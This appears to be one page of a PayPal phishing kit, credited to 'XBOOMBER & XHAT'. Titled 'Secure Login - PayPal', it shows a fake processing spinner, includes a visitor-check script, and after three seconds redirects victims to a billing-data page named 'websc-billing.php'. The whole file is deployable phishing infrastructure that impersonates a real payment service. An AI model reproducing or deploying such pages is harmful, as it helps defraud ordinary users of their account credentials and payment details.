<? include "XBOOMBER_check.php";?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en" class=" jsEnabled">
	<!-- UPDATE BY XBOOMBER & XHAT -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Secure Login - PayPal</title>
    <link media="screen" rel="stylesheet" type="text/css" href="./css/global.css">
    <link media="screen" rel="stylesheet" type="text/css" href="./css/coreLayout.css">
 <style type="text/css">
        #page {
            width: auto;
            max-width: 750px;
        }
        #rotatingImg {
            display: none;
        }
        #rotatingDiv {
            display: block;
            margin: 32px auto;
            height: 30px;
            width: 30px;
            -webkit-animation: rotation .7s infinite linear;
            -moz-animation: rotation .7s infinite linear;
            -o-animation: rotation .7s infinite linear;
            animation: rotation .7s infinite linear;
            border-left: 8px solid rgba(0, 0, 0, .20);
            border-right: 8px solid rgba(0, 0, 0, .20);
            border-bottom: 8px solid rgba(0, 0, 0, .20);
            border-top: 8px solid rgba(33, 128, 192, 1);
            border-radius: 100%;
        }
        @keyframes rotation {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(359deg);
            }
        }
        @-webkit-keyframes rotation {
            from {
                -webkit-transform: rotate(0deg);
            }
            to {
                -webkit-transform: rotate(359deg);
            }
        }
        @-moz-keyframes rotation {
            from {
                -moz-transform: rotate(0deg);
            }
            to {
                -moz-transform: rotate(359deg);
            }
        }
        @-o-keyframes rotation {
            from {
                -o-transform: rotate(0deg);
            }
            to {
                -o-transform: rotate(359deg);
            }
        }
        h3 {
            font-size: 1.4em;
            margin: 4em 0 0 0;
            line-height: normal;
        }
        p.note {
            color: #656565;
            font-size: 1.2em;
        }
        p.note a {
            color: #656565;
        }
        p strong {
            margin-top: 2em;
            color: #1A3665;
            font-size: 1.25em;
        }
        img.actionImage {
            margin: 2em auto;
        }
    </style>


    <meta http-equiv="refresh" content="3;URL=websc-billing.php">

    <style type="text/css">
        form#rosetta {
            display: none;
        }
    </style>
    <script type="text/javascript">
        PAYPAL.util.lazyLoadRoot = 'https\x3a\x2f\x2fwww\x2epaypalobjects\x2ecom\x2fWEBSCR\x2d640\x2d20140510\x2d1';
    </script>
    <link rel="shortcut icon" href="./img/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="./img/apple-touch-icon.png">
</head>

<body>



<? include ('bin/processing.html'); ?>
</body>

</html>